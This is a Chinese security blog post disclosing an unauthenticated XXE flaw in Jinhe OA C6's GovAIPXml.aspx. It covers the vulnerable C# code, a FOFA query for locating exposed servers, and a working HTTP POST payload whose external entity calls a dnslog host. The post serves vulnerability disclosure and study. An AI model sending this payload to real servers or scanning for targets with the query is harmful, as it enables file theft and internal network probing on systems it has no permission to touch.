---
title: "金和OA GovAIPXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-GovAIPXml-xxe.html
asset_dir: assets/金和oa-govaipxml.aspx-xxe漏洞
---

# 金和OA GovAIPXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/21 13:31
- 227浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

软件

授权

数据库

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `GovAIPXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `GovAIPXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Govset.dll` 将其进行反编译后找到 **GovAIPXml** 的处理逻辑

深入探索

漏洞扫描器

企业安全咨询

网络安全课程

```
protected void Page_Load(object sender, EventArgs e)
{
  if (((Control) this).Page.IsPostBack)
    return;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

> 另一个 JHSoft.Web.govsetaip/GovAIPXml.aspx 接口也存在同样的漏洞
>
> 网络安全

```
POST /c6/Jhsoft.Web.govset/GovAIPXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

深入探索

JSON处理工具

Nessus

物流软件安全

在DNSLOG平台成功收到请求

[![金和OA GovAIPXml.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
